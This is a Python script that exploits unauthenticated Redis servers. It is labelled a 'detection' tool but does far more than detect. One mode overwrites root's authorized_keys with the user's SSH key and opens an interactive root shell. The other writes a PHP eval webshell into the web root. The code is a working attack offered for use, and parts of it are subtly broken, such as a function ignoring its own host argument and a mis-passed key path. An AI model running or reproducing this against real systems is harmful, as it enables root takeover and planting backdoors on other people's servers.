# coding:utf-8
#redis 未授权访问漏洞检测
#commands: python3 redis_shell.py ip
import redis
import sys
import paramiko
import argparse

rsa_rub = '/root/.ssh/id_rsa.pub' #公钥路径
pkey = '/root/.ssh/id_rsa'        #私钥

#获取公钥内容

def get_id_rsa_pub():
    with open(rsa_rub,'rt') as f:
        id_rsa_pub = '\n\n\n{}\n\n'.format(f.read())
    return id_rsa_pub

def shell_redis(ip):
    try:
        r = redis.Redis(host=ip,port=6379,socket_timeout=5)
        r.config_set('dir','/root/.ssh/')
        print('[ok] : config set dir /root/.ssh/')
        r.config_set('dbfilename','authorized_keys')
        print('[ok] : config set dbfilename "authorized_keys"')
        id_rsa_pub = get_id_rsa_pub()
        r.set('crackit',id_rsa_pub)
        print('[ok] : set crackit')
        r.save()
        print('[ok] : save')
        key = paramiko.RSAKey.from_private_key(pkey)
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip,port = 22,username= 'root',pkey = key,timeout=5)
        ssh_stdin,ssh_stdout,ssh_stderr = ssh.exec_command('id')
        content = ssh_stdout.readlines()
        if content:
            print("[ok] connect to {} : {}".format(ip,content[0]))
        while True:
            command = input('{} >>> '.format(ip))
            ssh_stdin,ssh_stdout,ssh_stderr = ssh.exec_command(command)
            contents = ssh_stdout.readlines()
            for content in contents:
                print(content)
    except Exception as e:
        error = e.args
        if error == ('', ):
            error = 'save error'
        print('[-] [{}] : {}'.format(error,ip))

def webshell(host,path):
    try:
        r = redis.Redis(host=ip,port=6379,socket_timeout=5)
        r.config_set('dir',path)
        print('[ok] : config set dir '+path)
        r.config_set('dbfilename',"shell.php")
        print('[ok] : config set dbfilename shell.php')
        r.set("payload","<?php @eval($_POST['reader']);?>")
        print('[ok] : 写入webshell')
        r.save()
        print('[ok] : save')
    except Exception as e:
        error = e.args
        if error == ('',):
            error = 'save error'
        print('[-] [{}] : {}'.format(error, ip))

def parse_args():
    parser = argparse.ArgumentParser(epilog="\tExample: \r\npython3 " + sys.argv[0] + "-m [method|sshshell] -h/-i [host|ip] [-p 和sshshell方法配合写入webshell]")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-i', '--ip', help="Target ip.", default="127.0.0.1", required=True)
    parser.add_argument('-m', '--method',help = "the method you want to use",default="webshell")
    parser.add_argument('-h','--host',help = 'the target host',default="http://127.0.01/")
    parser.add_argument('-p','--path',help="absolute path",default='/var/www/html/')
    return parser.parse_args()


def parser_error(errmsg):
    print("Usage: python3 " + sys.argv[0] + " [Options] use -h for more detail")
    sys.exit()

if __name__ == '__main__':
    args = parse_args()
    print("Usage: python3 " + sys.argv[0] + " [Options] -m [method|sshshell] -h/-i [host|ip] [-p 和sshshell方法配合写入webshell]")
    ip = args.ip
    method = args.method
    host = args.host
    path = args.path
    if ip or host:
        if method:
            print("Usage: python3 " + sys.argv[0] + " [Options] -m [method|sshshell] -h/-i [host|ip] [-p 和sshshell方法配合写入webshell]")
            if method == "webshell":
                webshell(host=host,path=path)
            if method == "sshshell":
                shell_redis(ip)
    else:
        parser_error()